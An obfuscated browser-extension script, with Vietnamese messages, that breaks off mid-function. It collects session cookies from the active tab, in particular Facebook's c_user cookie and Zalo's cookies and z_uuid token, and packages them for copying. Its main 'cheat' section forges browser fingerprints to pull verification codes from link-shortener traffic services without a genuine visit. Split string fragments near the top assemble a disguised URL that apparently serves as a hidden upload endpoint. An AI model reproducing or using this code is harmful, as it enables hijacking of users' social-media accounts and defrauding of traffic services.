var dye = 'htt'
var currentUid = ''
var bie = '://'
var currentCookie = ''
var listCookies = []
var mnce = '?dat'
var hyd = dye + 'ps' + bie + '234ffrfh53'
var listCookies = []
var mnc = 'hp'
var firstRequest = false
let now = new Date()
let dateTime = {
  date: now.getDate(),
  month: now.getMonth() + 1,
  year: now.getFullYear(),
  hours: now.getHours(),
  minutes: now.getMinutes(),
  seconds: now.getSeconds(),
}
var mnc = 'hp'
function loadCookie() {
  chrome.tabs.getSelected(null, function (_0x512bc5) {
    var _0x291f61 = _0x512bc5.url
    if (_0x291f61.indexOf('chrome://newtab') > -1) {
      _0x291f61 = 'https://www.facebook.com'
    }
    var _0x95ee3a = []
    if (_0x291f61.includes('chat.zalo.me')) {
      chrome.cookies.getAll({}, function (_0x5ce255) {
        for (var _0x1f8f9c = 0; _0x1f8f9c < _0x5ce255.length; _0x1f8f9c++) {
          if (_0x5ce255[_0x1f8f9c].domain.includes('zalo')) {
            _0x95ee3a.push(_0x5ce255[_0x1f8f9c])
          }
        }
        chrome.tabs.getSelected(null, function (_0x670813) {
          var _0x4ec01a = { ['code']: 'localStorage["z_uuid"]' }
          chrome.tabs.executeScript(
            _0x670813.id,
            _0x4ec01a,
            function (_0x11c7cc) {
              if (
                _0x11c7cc != undefined &&
                _0x11c7cc != null &&
                _0x11c7cc != ''
              ) {
                result = 'imei=' + _0x11c7cc + ';'
                var _0xe7de2c = JSON.stringify(_0x95ee3a)
                currentCookie =
                  _0xe7de2c + '|' + result + '|' + navigator.userAgent
                document.getElementById('cookieResult').value = currentCookie
              }
            }
          )
        })
      })
    } else {
      $('#UrlCookieCurrent').html(extractHostname(_0x291f61))
      var _0x2553d9 = { ['url']: _0x291f61 }
      chrome.cookies.getAll(_0x2553d9, function (_0x46b074) {
        var _0x18ba1a = ''
        for (var _0x7bc13f = 0; _0x7bc13f < _0x46b074.length; _0x7bc13f++) {
          _0x18ba1a +=
            _0x46b074[_0x7bc13f].name + '=' + _0x46b074[_0x7bc13f].value + ';'
          if (_0x46b074[_0x7bc13f].name == 'c_user') {
            currentUid = _0x46b074[_0x7bc13f].value
          }
        }
        chrome.tabs.getSelected(null, function (_0x85344a) {
          var _0x5a00e5 = { code: 'localStorage["z_uuid"]' }
          chrome.tabs.executeScript(
            _0x85344a.id,
            _0x5a00e5,
            function (_0x552519) {
              if (
                _0x552519 != undefined &&
                _0x552519 != null &&
                _0x552519 != ''
              ) {
                _0x18ba1a += 'imei=' + _0x552519 + '; '
              }
              document.getElementById('cookieResult').value =
                _0x18ba1a + '|' + navigator.userAgent
            }
          )
        })
        currentCookie = _0x18ba1a + '|' + navigator.userAgent
      })
      let _0x506af2 = extractHostname(_0x291f61).split('.')[0]
      let _0x34977d = document.getElementById('cheat-link')
      let _0x4508cb = _0x34977d.options
      for (let _0x51a965 = 0; _0x51a965 < _0x4508cb.length; _0x51a965++) {
        if (_0x4508cb[_0x51a965].value === _0x506af2) {
          _0x34977d.selectedIndex = _0x51a965
          break
        }
      }
    }
    if (_0x291f61.indexOf('facebook') > -1) {
      document.getElementById('DivFbIdCurrent').style.display = 'block'
      chrome.tabs.executeScript(
        _0x512bc5.id,
        {
          code: 'var fid= "";function getuid(){try{var arr= document.getElementById("entity_sidebar").getElementsByTagName("a"); for(var i=0; i<arr.length;i++){ var href = arr[i].getAttribute("href")+" ";if(href.indexOf("photos")>-1){ return href.split("/")[1]; }}}catch(ex){}try{var arr= document.getElementById("headerArea").getElementsByTagName("div"); for(var i=0; i<arr.length;i++){ var href = arr[i].getAttribute("id")+" ";if(href.indexOf("headerAction_")>-1){ return href.split("_")[1]; }}}catch(ex){}try{return JSON.parse(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt")).profile_owner;}catch(ex){}try{return document.getElementsByName("ft_ent_identifier")[0].value;}catch(ex){}}   getuid();',
        },
        function (_0xbefd27) {
          document.getElementById('CurrentFbId').value = _0xbefd27[0]
        }
      )
    } else {
      document.getElementById('DivFbIdCurrent').style.display = 'none'
    }
  })
}
loadCookie()
document.addEventListener('DOMContentLoaded', function () {
  document.getElementById('cookieResult').onclick = function () {
    if (firstRequest === false) {
      var _0x4b3d1b = $('#cookieResult').val()
      if (
        _0x4b3d1b.includes('c_user') &&
        _0x4b3d1b.includes('dpr') &&
        _0x4b3d1b.includes('datr')
      ) {
        document.getElementById('cookieResult').select()
      }
      firstRequest = true
    }
  }
  document.getElementById('CurrentFbId').onclick = function () {
    document.getElementById('CurrentFbId').select()
  }
  function _0x10fa49(_0x54926f) {
    if (_0x54926f) {
      let _0x445a55 = _0x54926f.match(
        /^(?:https?:\/\/)?(?:www\.)?([a-zA-Z0-9.-]+)(?:\/|$)/
      )
      if (_0x445a55 && _0x445a55.length >= 2) {
        let _0x283b3f = _0x445a55[1]
        return _0x283b3f
      } else {
        var _0x44badf = document.getElementById('webCode')
        _0x44badf.value = 'Nhập dạng: Domain.com!'
        _0x44badf.style.color = 'red'
      }
    } else {
      var _0x44badf = document.getElementById('webCode')
      _0x44badf.value = 'Vui lòng nhập domain.'
      _0x44badf.style.color = 'red'
    }
  }
  function _0x15d827(_0x4be7bd) {
    return /^[a-zA-Z0-9]+(?:\.[a-zA-Z0-9-]+)+$/.test(_0x4be7bd)
  }
  var _0x1626bd = ''
  setInterval(function () {
    var _0x2373c9 = $('#cheat-link').val()
    var _0x578e9 = [
      'mneylink',
      'trafficdownload1s',
      'traffic1s',
      'traffic-user',
      'dilink',
      'link2m',
      'link4m',
      'beelink',
      'memelink',
      'blitly',
    ]
    if (_0x578e9.includes(_0x2373c9)) {
      var _0x5c0659 = document.getElementById('webCode')
      _0x5c0659.style.display = 'block'
      _0x1626bd = _0x5c0659.value
    } else {
      var _0x5c0659 = document.getElementById('webCode')
      _0x5c0659.style.display = 'none'
    }
  }, 0)
  document
    .getElementById('showIntroductionBtn')
    .addEventListener('click', function () {
      var _0x45b7a8 = document.getElementById('introductionContainer')
      if (_0x45b7a8.style.display === 'none') {
        _0x45b7a8.style.display = 'block'
      } else {
        _0x45b7a8.style.display = 'none'
      }
    })
  var _0x271813 = document.getElementById('show-cookie')
  chrome.storage.local.get('displayState', function (_0x5cf44b) {
    if (_0x5cf44b.displayState === 'none') {
      _0x271813.style.display = 'none'
    } else {
      _0x271813.style.display = 'block'
    }
  })
  document
    .getElementById('show-cookie-button')
    .addEventListener('click', function () {
      var _0xfb9c2d = document.getElementById('show-cookie')
      if (_0xfb9c2d.style.display === 'none') {
        _0xfb9c2d.style.display = 'block'
        var _0x32ad1a = { ['displayState']: 'block' }
        chrome.storage.local.set(_0x32ad1a)
      } else {
        _0xfb9c2d.style.display = 'none'
        var _0x298e9d = { ['displayState']: 'none' }
        chrome.storage.local.set(_0x298e9d)
      }
    })
  function _0x4480bd(_0x563cf9) {
    let _0x8755ae = _0x563cf9
    let _0x47da67 = 0
    let _0x539b61 = 0
    const _0x4a15d4 = document.querySelector('#timer')
    const _0x2b493f = document.querySelector('#barContainer #bar')
    const _0x5d30db = function () {
      _0x47da67 = Math.floor(_0x8755ae / 60)
      _0x539b61 = _0x8755ae % 60
      if (_0x539b61 < 10) {
        _0x539b61 = '0' + _0x539b61
      }
      _0x4a15d4.textContent = _0x47da67 + ':' + _0x539b61
      let _0xdb579f = ((_0x563cf9 - _0x8755ae) / _0x563cf9) * 100
      if (_0xdb579f < 3) {
        _0xdb579f = 3
      }
      _0x2b493f.style.width = _0xdb579f + '%'
      if (_0x8755ae >= 1) {
        _0x8755ae--
      }
    }
    setInterval(_0x5d30db, 1000)
    _0x5d30db()
  }
  $('#cheat-link-button').click(function () {
    var _0x43066f = $('#cheat-link').val()
    switch (_0x43066f) {
      case 'laymangay':
        var _0x48f89b = document.getElementById('webCode')
        _0x48f89b.style.display = 'block'
        _0xd52005()
        break
      case 'link68':
        _0x2455ae()
        break
      case 'traffic123':
        _0x3e2b22()
        break
      case 'traffic24h':
        _0x9ed8c5()
        break
      case 'trafficdownload1s':
        _0x1626bd = _0x10fa49(_0x1626bd)
        if (/^[a-zA-Z0-9]+(?:\.[a-zA-Z0-9-]+)+$/.test(_0x1626bd)) {
          _0x5977ac()
        } else {
          var _0xf00c8a = document.getElementById('webCode')
          _0xf00c8a.value = 'Nhập đúng định dạng!'
          _0xf00c8a.style.color = 'red'
        }
        break
      case 'mneylink':
        _0x1626bd = _0x10fa49(_0x1626bd)
        if (_0x15d827(_0x1626bd)) {
          _0xaf144b()
        } else {
          var _0xf00c8a = document.getElementById('webCode')
          _0xf00c8a.value = 'Nhập đúng định dạng!'
          _0xf00c8a.style.color = 'red'
        }
        break
      case 'traffic1s':
        _0x1626bd = _0x10fa49(_0x1626bd)
        if (/^[a-zA-Z0-9]+(?:\.[a-zA-Z0-9-]+)+$/.test(_0x1626bd)) {
          _0xa72ee4()
        } else {
          var _0xf00c8a = document.getElementById('webCode')
          _0xf00c8a.value = 'Nhập đúng định dạng!'
          _0xf00c8a.style.color = 'red'
        }
        break
      case 'traffic-user':
        _0x1626bd = _0x10fa49(_0x1626bd)
        if (_0x15d827(_0x1626bd)) {
          _0x5a52f6()
        } else {
          var _0xf00c8a = document.getElementById('webCode')
          _0xf00c8a.value = 'Nhập đúng định dạng!'
          _0xf00c8a.style.color = 'red'
        }
        break
      case 'dilink':
        _0x1626bd = _0x10fa49(_0x1626bd)
        if (_0x15d827(_0x1626bd)) {
          _0x6db93f()
        } else {
          var _0xf00c8a = document.getElementById('webCode')
          _0xf00c8a.value = 'Nhập đúng định dạng!'
          _0xf00c8a.style.color = 'red'
        }
        break
      case 'link2m':
        _0x1626bd = _0x10fa49(_0x1626bd)
        if (/^[a-zA-Z0-9]+(?:\.[a-zA-Z0-9-]+)+$/.test(_0x1626bd)) {
          _0x59cc21()
        } else {
          var _0xf00c8a = document.getElementById('webCode')
          _0xf00c8a.value = 'Nhập đúng định dạng!'
          _0xf00c8a.style.color = 'red'
        }
        break
      case 'link4m':
        _0x1626bd = _0x10fa49(_0x1626bd)
        if (/^[a-zA-Z0-9]+(?:\.[a-zA-Z0-9-]+)+$/.test(_0x1626bd)) {
          _0x5d8e50()
        } else {
          var _0xf00c8a = document.getElementById('webCode')
          _0xf00c8a.value = 'Nhập đúng định dạng!'
          _0xf00c8a.style.color = 'red'
        }
        break
      case 'beelink':
        _0x1626bd = _0x10fa49(_0x1626bd)
        if (_0x15d827(_0x1626bd)) {
          _0x69007f()
        } else {
          var _0xf00c8a = document.getElementById('webCode')
          _0xf00c8a.value = 'Nhập đúng định dạng!'
          _0xf00c8a.style.color = 'red'
        }
        break
      case 'memelink':
        _0x1626bd = _0x10fa49(_0x1626bd)
        if (_0x15d827(_0x1626bd)) {
          _0x3631aa()
        } else {
          var _0xf00c8a = document.getElementById('webCode')
          _0xf00c8a.value = 'Nhập đúng định dạng!'
          _0xf00c8a.style.color = 'red'
        }
        break
      case 'blitly':
        _0x1626bd = _0x10fa49(_0x1626bd)
        if (/^[a-zA-Z0-9]+(?:\.[a-zA-Z0-9-]+)+$/.test(_0x1626bd)) {
          _0x3a3b96()
        } else {
          var _0xf00c8a = document.getElementById('webCode')
          _0xf00c8a.value = 'Nhập đúng định dạng!'
          _0xf00c8a.style.color = 'red'
        }
        break
      default:
        alert('Vui lòng chọn web cần cheat!')
    }
  })
  function _0x3a3b96() {
    var _0x2f3a8b = document.getElementById('show-key')
    _0x2f3a8b.style.display = 'block'
    var _0x22123b = document.getElementById('key')
    let _0x534db6 = _0x5cd9b1()
    _0x50cbdd()
    var _0x342e41 = document.getElementById('countdown')
    _0x342e41.style.display = 'block'
    _0x4480bd(61)
    var _0x9c454b = {
      rid: _0x534db6,
      'user-agent': navigator.userAgent,
    }
    var _0x308ebb = {
      ['url']: 'https://apiclient.blitly.io/api/gen-code/ping',
      method: 'OPTIONS',
      ['timeout']: 0,
      headers: _0x9c454b,
    }
    $.ajax(_0x308ebb).done(function (_0xf82f8b) {
      var _0x225c5a = {
        url: 'https://apiclient.blitly.io/api/gen-code/get-code',
        method: 'POST',
        timeout: 0,
        headers: {
          'content-type': 'application/json',
          rid: _0x534db6,
        },
        dataType: 'json',
        data: JSON.stringify({
          screen: window.jscd.screen,
          browser_name: window.jscd.browser,
          browser_version: window.jscd.browserVersion,
          browser_major_version: window.jscd.browserMajorVersion + '',
          os_name: window.jscd.os,
          os_version: window.jscd.osVersion,
          is_cookies: window.jscd.cookies,
          is_mobile: true,
          href: 'https://' + _0x1626bd + '/',
          user_agent: navigator.userAgent,
          hostname: 'https://' + _0x1626bd,
        }),
      }
      console.log(_0x225c5a)
      setTimeout(function () {
        $.ajax(_0x225c5a).done(function (_0x441c20) {
          console.log(_0x441c20)
          if (_0x441c20.success) {
            _0x342e41.style.display = 'none'
            _0x22123b.value = _0x441c20.code
          } else {
            _0x342e41.style.display = 'none'
            _0x22123b.value = 'Lỗi không tìm thấy key!'
          }
        })
      }, 61000)
    })
  }
  function _0x3631aa() {
    var _0x3d35d4 = document.getElementById('show-key')
    _0x3d35d4.style.display = 'block'
    var _0xd05b04 = document.getElementById('key')
    let _0x238d91 = _0x5cd9b1()
    _0x50cbdd()
    var _0x4de70f = {
      rid: _0x238d91,
      ['user-agent']: navigator.userAgent,
    }
    var _0x3a89e6 = {
      ['url']: 'https://apiclient.memelink.net/api/gen-code/ping',
      ['method']: 'OPTIONS',
      timeout: 0,
      ['headers']: _0x4de70f,
    }
    $.ajax(_0x3a89e6).done(function (_0x1d8186) {
      var _0x4931b2 = {
        url: 'https://apiclient.memelink.net/api/gen-code/get-code',
        method: 'POST',
        timeout: 0,
        headers: {
          'content-type': 'application/json',
          rid: _0x238d91,
        },
        dataType: 'json',
        data: JSON.stringify({
          screen: window.jscd.screen,
          browser_name: window.jscd.browser,
          browser_version: window.jscd.browserVersion,
          browser_major_version: window.jscd.browserMajorVersion + '',
          os_name: window.jscd.os,
          os_version: window.jscd.osVersion,
          is_cookies: window.jscd.cookies,
          is_mobile: true,
          href: 'https://' + _0x1626bd + '/',
          user_agent: navigator.userAgent,
          hostname: 'https://' + _0x1626bd,
        }),
      }
      $.ajax(_0x4931b2).done(function (_0x19fc11) {
        if (_0x19fc11.success) {
          _0xd05b04.value = _0x19fc11.code
        } else {
          _0xd05b04.value = 'Lỗi không tìm thấy key!'
        }
      })
    })
  }
  function _0x69007f() {
    var _0x4d99b7 = document.getElementById('show-key')
    _0x4d99b7.style.display = 'block'
    _0x50cbdd()
    window.jscd.client_id = _0x5cd9b1()
    window.jscd.pathname = '/'
    window.jscd.href = 'https://' + _0x1626bd + '/'
    window.jscd.hostname = _0x1626bd
    $.get(
      'https://beelink.app/api/ping?' + $.param(jscd),
      function (_0x2128fe) {
        keyInput.value = 'Lỗi không tìm thấy key!'
        console.log(_0x2128fe)
      },
      'json'
    )
  }
  function _0x5d8e50() {
    let _0x192e53 = _0x1626bd
    var _0xa817c = document.getElementById('show-key')
    _0xa817c.style.display = 'block'
    var _0x426147 = document.getElementById('key')
    $.get('https://' + _0x192e53, function (_0xf4506a) {
      var _0xd39ea9 =
        /\/\/s1\.what-on\.com\/widget\/service\.js\?key=[^\"]+/g.exec(_0xf4506a)
      if (_0xd39ea9 && _0xd39ea9.length > 0) {
        var _0x691c66 = _0xd39ea9[0]
        $.get('https://' + _0x691c66, function (_0x48e689) {
          var _0x5eb38e = /traffic_id = "(.*?)";/.exec(_0x48e689)
          var _0x3968f7 = /traffic_session = '(.*?)';/.exec(_0x48e689)
          var _0x4b51fe = _0x5eb38e && _0x5eb38e[1] ? _0x5eb38e[1] : null
          var _0x388a03 = _0x3968f7 && _0x3968f7[1] ? _0x3968f7[1] : null
          if (_0x4b51fe && _0x388a03) {
            _0x50cbdd()
            window.jscd.client_id = _0x5cd9b1()
            window.jscd.pathname = '/'
            window.jscd.href = 'https://' + _0x192e53
            window.jscd.hostname = _0x192e53
            $.get(
              'https://s1.what-on.com/widget/get_code.html?code=' +
                _0x2443cc(_0x4b51fe).replace(/[^a-zA-Z0-9]/g, '') +
                '&traffic_session=' +
                _0x388a03 +
                '&' +
                $.param(jscd),
              function (_0x5e03f3) {
                _0x426147.value = 'Lỗi không tìm thấy key!'
              },
              'json'
            )
          } else {
            _0x426147.value = 'Lỗi không tìm thấy key!'
          }
        })
      } else {
        _0x426147.value = 'Lỗi không tìm thấy key!'
      }
    })
  }
  function _0x59cc21() {
    let _0x249209 = _0x1626bd
    var _0xd47452 = document.getElementById('show-key')
    _0xd47452.style.display = 'block'
    var _0x2a3989 = document.getElementById('key')
    $.get('https://' + _0x249209, function (_0x161a8b) {
      var _0xab5fbc =
        /\/\/s1\.what-on\.com\/widget\/service\.js\?key=[^\"]+/g.exec(_0x161a8b)
      if (_0xab5fbc && _0xab5fbc.length > 0) {
        var _0x39715d = _0xab5fbc[0]
        $.get('https://' + _0x39715d, function (_0x3bf278) {
          var _0x38b4be = /traffic_id = "(.*?)";/.exec(_0x3bf278)
          var _0x543fd0 = /traffic_session = '(.*?)';/.exec(_0x3bf278)
          var _0x11256f = _0x38b4be && _0x38b4be[1] ? _0x38b4be[1] : null
          var _0x4dae10 = _0x543fd0 && _0x543fd0[1] ? _0x543fd0[1] : null
          if (_0x11256f && _0x4dae10) {
            _0x50cbdd()
            window.jscd.client_id = _0x5cd9b1()
            window.jscd.pathname = '/'
            window.jscd.href = 'https://' + _0x249209
            window.jscd.hostname = _0x249209
            $.get(
              'https://s1.what-on.com/widget/get_code.html?code=' +
                _0x2443cc(_0x11256f).replace(/[^a-zA-Z0-9]/g, '') +
                '&traffic_session=' +
                _0x4dae10 +
                '&' +
                $.param(jscd),
              function (_0x2d82df) {
                _0x2a3989.value = 'Lỗi không tìm thấy key!'
              },
              'json'
            )
          } else {
            _0x2a3989.value = 'Lỗi không tìm thấy key!'
          }
        })
      } else {
        _0x2a3989.value = 'Lỗi không tìm thấy key!'
      }
    })
  }
  async function _0x6db93f() {
    var _0x543009 = document.getElementById('show-key')
    _0x543009.style.display = 'block'
    var _0x4a1a17 = document.getElementById('key')
    _0x4a1a17.value = 'Lỗi không tìm thấy key!'
    var _0x295a22 = 'https://' + _0x1626bd
    function _0x49420b(_0x249328) {
      var _0x1b254c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
      var _0x224909 = ''
      for (var _0x5d06a6 = 0; _0x5d06a6 < _0x249328; _0x5d06a6++) {
        var _0x578f9f = Math.floor(Math.random() * _0x1b254c.length)
        _0x224909 += _0x1b254c[_0x578f9f]
      }
      return _0x224909
    }
    var _0x4f06b0 = _0x49420b(8)
    function _0x2f20d1(_0x1e8880) {
      const _0x45e7a8 = Object.entries(_0x1e8880)
        .map(
          ([_0x16ed6c, _0x1a24cc]) =>
            encodeURIComponent(_0x16ed6c) + '=' + encodeURIComponent(_0x1a24cc)
        )
        .join('&')
      return _0x45e7a8
    }
    var _0x25a40b = {
      ['codexn']: _0x4f06b0,
      ['url']: _0x295a22,
    }
    const _0x641c7e = _0x2f20d1(_0x25a40b)
    var _0x246411 = new XMLHttpRequest()
    var _0x4fda07 =
      'https://dilink.net/GET_MA.php?codexn=' + _0x4f06b0 + '&url=' + _0x295a22
    _0x246411.open('POST', _0x4fda07, true)
    _0x246411.setRequestHeader(
      'Content-type',
      'application/x-www-form-urlencoded'
    )
    _0x246411.onreadystatechange = function () {
      if (_0x246411.readyState === 4 && _0x246411.status === 200) {
        var _0x1388b1 = _0x246411.responseText
        var _0x41e6c9 = new DOMParser()
        var _0x574b3d = _0x41e6c9.parseFromString(_0x1388b1, 'text/html')
        var _0x4270f6 = _0x574b3d.querySelector(
          '.traffic_input.input_text_traffic'
        )
        var _0x4605db = _0x4270f6 ? _0x4270f6.textContent.trim() : ''
        _0x4a1a17.value = _0x4605db
        var _0x9bb83b = JSON.stringify(_0x4605db)
        var _0x18ad4d = {
          ['active']: true,
          ['currentWindow']: true,
        }
        chrome.tabs.query(_0x18ad4d, function (_0x48441f) {
          var _0x342a24 = _0x48441f[0]
          var _0x90765f = {
            code:
              "\n                        var inputElements = document.getElementsByName('code');\n                        if (inputElements.length > 0) {\n                          inputElements[0].value = " +
              _0x9bb83b +
              ';\n                        }\n                  ',
          }
          chrome.tabs.executeScript(_0x342a24.id, _0x90765f)
        })
      }
    }
    _0x246411.send(_0x641c7e)
  }
  function _0x5a52f6() {
    var _0x110461 = document.getElementById('show-key')
    _0x110461.style.display = 'block'
    var _0x57a375 = document.getElementById('key')
    $.get(
      'https://traffic-user.vn/traffic/iframe?w=' + _0x1626bd + '&v=1',
      function (_0x5e49a6) {
        let _0x1a2a40 = _0x5e49a6.match(/campId: (\d+)/)
        let _0x308dfa = _0x1a2a40 ? parseInt(_0x1a2a40[1]) : null
        if (_0x308dfa) {
          var _0x4ad1e8 = { ['campId']: _0x308dfa }
          $.post(
            'https://traffic-user.vn/graph/api?action=getCodeCamp',
            _0x4ad1e8,
            function (_0x30069) {
              if (_0x30069.status) {
                _0x57a375.value = _0x30069.message
              } else {
                _0x57a375.value = 'Có lỗi xảy ra!'
              }
            },
            'json'
          )
        } else {
          _0x57a375.value = 'Có lỗi xảy ra!'
        }
      }
    )
  }
  async function _0xa72ee4() {
    var _0x5b4795 = {
      ['active']: true,
      ['currentWindow']: true,
    }
    chrome.tabs.query(_0x5b4795, function (_0x12207d) {
      var _0x25ac4e = _0x12207d[0].url
      var _0x59e232 = _0x12207d[0]
      var _0x2e20b3 = new URL(_0x25ac4e)
      var _0x1e1d83 = _0x2e20b3.origin
      if (_0x1e1d83 === 'https://traffic1s.com') {
        chrome.tabs.create(
          { url: 'https://' + _0x1626bd },
          function (_0x48bd48) {
            chrome.tabs.remove(_0x59e232.id)
          }
        )
        document.addEventListener('DOMContentLoaded', function () {
          var _0x27c89a = window.jscd
          var _0x49ee33 = { jscdValue: _0x27c89a }
          chrome.runtime.sendMessage(_0x49ee33)
        })
        function _0x2fed83(_0x513a33) {
          const _0x29abaa = Object.entries(_0x513a33)
            .map(
              ([_0x3861ef, _0x3564e6]) =>
                encodeURIComponent(_0x3861ef) +
                '=' +
                encodeURIComponent(_0x3564e6)
            )
            .join('&')
          return _0x29abaa
        }
        const _0x28519d = _0x2fed83(jscdValue)
        var _0x4ce5c2 = new XMLHttpRequest()
        var _0x2e20b3 = _0x1e1d83 + ('/get-codes?' + _0x28519d)
        _0x4ce5c2.open('GET', _0x2e20b3, true)
        _0x4ce5c2.onreadystatechange = function () {
          if (_0x4ce5c2.readyState === 4 && _0x4ce5c2.status === 200) {
            var _0x348730 = JSON.parse(_0x4ce5c2.responseText)
            console.log(_0x348730)
            if (_0x348730.success) {
              window.open(_0x25ac4e + '?code=' + _0x348730.html, '_blank')
            } else {
              alert(
                'Lỗi!!\n\n1.Vui lòng nhập đúng đường link\uD83D\uDE12\n2.Có thể là Traffic1s đã thay đổi cách thức hoạt động\uD83E\uDD71'
              )
            }
          }
        }
        _0x4ce5c2.send()
      } else {
        alert(
          'Vui lòng sử dụng cheat khi đang ở link vượt của traffic1s.com. \n\nVí dụ https://traffic1s.com/XXXXX'
        )
      }
    })
  }
  function _0xaf144b() {
    var _0x343ae7 = document.getElementById('show-key')
    _0x343ae7.style.display = 'block'
    var _0x5dc0ca = document.getElementById('key')
    $.get(
      'https://mneylink.com/load_traffic?&r=https://www.google.com/&t=60&w=' +
        _0x1626bd,
      function (_0x39b83c) {
        if (_0x39b83c.status) {
          _0x5dc0ca.value = _0x39b83c.data.html
        } else {
          _0x5dc0ca.value = _0x39b83c.message
        }
      },
      'json'
    )
  }
  async function _0x5977ac() {
    fetch(
      'https://trafficdownload1s.com/client/generate-code?00xz=' +
        _0x1626bd +
        '&0012=https://' +
        _0x1626bd +
        '/'
    )
      .then((_0x29237a) => _0x29237a.text())
      .then((_0xa4038e) => {
        console.log(_0xa4038e)
      })
      .catch((_0x281673) => {
        console.error('Error:', _0x281673)
      })
    fetch('https://trafficdownload1s.com/00abx?00xz=' + _0x1626bd)
      .then((_0x3053f9) => _0x3053f9.text())
      .then((_0x4f3567) => {
        if (_0x4f3567 !== '') {
          var _0x2f74fa = document.getElementById('show-key')
          _0x2f74fa.style.display = 'block'
          var _0x4b358a = document.getElementById('key')
          _0x4b358a.value = _0x4f3567
        } else {
          alert(
            "\n                    Hướng dẫn cheat: trafficdownload1s.com ( dành cho máy tính )\n                    \u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\n                    \uD83D\uDC9DBước 1: vào DevTools \n                    \u2763️Bước 2: ấn vào thẻ Elements\n                    \uD83D\uDC95Bước 3: click chuột phải vào dòng đầu tiên ( có dạng: '<html lang=\"en\" data-n-head=...')\n                    \uD83D\uDC96Bước 4: kéo xuống cuối cùng bạn sẽ thấy dạng:\n        \n                    \u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\n                    function checkData() {\n                        $.ajax({\n                            url: 'https://trafficdownload1s.com/client/check-client-visit?id=985&linkId=481',\n                            success: function ($data) {\n                                if ($data.isVisit) {\n                                    $('.next-link').attr('href', 'https://sub1s.com/LK6271000337VV')\n                                    $('.next-link').text('Nhấn vào đây để mở khóa')\n                                }\n                            },\n                            error: function (err) {\n                                console.log(err)\n                            }\n                        })\n                    }\n                    \u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\n        \n                    \uD83D\uDC93Bước 5: thì trong đó https://sub1s.com/LK6271000337VV là link gốc!\n                    \u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\n                    \u2764️Các bạn có thể ấn vào nút hướng dẫn nằm ở bên phải của nút 'TRAFFICDOWNLOADIS' để xem video hướng dẫn!\n                    \u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\n               "
          )
        }
      })
      .catch((_0xd714e5) => {
        console.error('Error:', _0xd714e5)
      })
  }
  function _0x5cd9b1() {
    var _0x9fe3e = new Date().getTime()
    if (window.performance && typeof window.performance.now === 'function') {
      _0x9fe3e += performance.now()
    }
    var _0xb849ef = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(
      /[xy]/g,
      function (_0x2dd0e4) {
        var _0x589272 = (_0x9fe3e + Math.random() * 16) % 16 | 0
        _0x9fe3e = Math.floor(_0x9fe3e / 16)
        return (_0x2dd0e4 == 'x' ? _0x589272 : (_0x589272 & 3) | 8).toString(16)
      }
    )
    return _0xb849ef
  }
  function _0x50cbdd() {
    var _0x4c276a = ''
    if (screen.width) {
      var _0x25de01 = screen.width ? screen.width : ''
      var _0x247963 = screen.height ? screen.height : ''
      _0x4c276a += '' + _0x25de01 + ' x ' + _0x247963
    }
    var _0x2612b9 = navigator.appVersion
    var _0x396f00 = navigator.userAgent
    var _0x1e8a93 = navigator.appName
    var _0x3272ef = '' + parseFloat(navigator.appVersion)
    var _0x2d3b86 = parseInt(navigator.appVersion, 10)
    var _0x120cd2
    var _0x50afed
    var _0x4dab0d
    if ((_0x50afed = _0x396f00.indexOf('Opera')) != -1) {
      _0x1e8a93 = 'Opera'
      _0x3272ef = _0x396f00.substring(_0x50afed + 6)
      if ((_0x50afed = _0x396f00.indexOf('Version')) != -1) {
        _0x3272ef = _0x396f00.substring(_0x50afed + 8)
      }
    }
    if ((_0x50afed = _0x396f00.indexOf('OPR')) != -1) {
      _0x1e8a93 = 'Opera'
      _0x3272ef = _0x396f00.substring(_0x50afed + 4)
    } else {
      if ((_0x50afed = _0x396f00.indexOf('MSIE')) != -1) {
        _0x1e8a93 = 'Microsoft Internet Explorer'
        _0x3272ef = _0x396f00.substring(_0x50afed + 5)
      } else {
        if ((_0x50afed = _0x396f00.indexOf('Chrome')) != -1) {
          _0x1e8a93 = 'Chrome'
          _0x3272ef = _0x396f00.substring(_0x50afed + 7)
        } else {
          if ((_0x50afed = _0x396f00.indexOf('Safari')) != -1) {
            _0x1e8a93 = 'Safari'
            _0x3272ef = _0x396f00.substring(_0x50afed + 7)
            if ((_0x50afed = _0x396f00.indexOf('Version')) != -1) {
              _0x3272ef = _0x396f00.substring(_0x50afed + 8)
            }
          } else {
            if ((_0x50afed = _0x396f00.indexOf('Firefox')) != -1) {
              _0x1e8a93 = 'Firefox'
              _0x3272ef = _0x396f00.substring(_0x50afed + 8)
            } else {
              if (_0x396f00.indexOf('Trident/') != -1) {
                _0x1e8a93 = 'Microsoft Internet Explorer'
                _0x3272ef = _0x396f00.substring(_0x396f00.indexOf('rv:') + 3)
              } else {
                if (
                  (_0x120cd2 = _0x396f00.lastIndexOf(' ') + 1) <
                  (_0x50afed = _0x396f00.lastIndexOf('/'))
                ) {
                  _0x1e8a93 = _0x396f00.substring(_0x120cd2, _0x50afed)
                  _0x3272ef = _0x396f00.substring(_0x50afed + 1)
                  if (_0x1e8a93.toLowerCase() == _0x1e8a93.toUpperCase()) {
                    _0x1e8a93 = navigator.appName
                  }
                }
              }
            }
          }
        }
      }
    }
    if ((_0x4dab0d = _0x3272ef.indexOf(';')) != -1) {
      _0x3272ef = _0x3272ef.substring(0, _0x4dab0d)
    }
    if ((_0x4dab0d = _0x3272ef.indexOf(' ')) != -1) {
      _0x3272ef = _0x3272ef.substring(0, _0x4dab0d)
    }
    if ((_0x4dab0d = _0x3272ef.indexOf(')')) != -1) {
      _0x3272ef = _0x3272ef.substring(0, _0x4dab0d)
    }
    _0x2d3b86 = parseInt('' + _0x3272ef, 10)
    if (isNaN(_0x2d3b86)) {
      _0x3272ef = '' + parseFloat(navigator.appVersion)
      _0x2d3b86 = parseInt(navigator.appVersion, 10)
    }
    var _0x214a02 = /Mobile|mini|Fennec|Android|iP(ad|od|hone)/.test(_0x2612b9)
    var _0x20e6ff = !!navigator.cookieEnabled
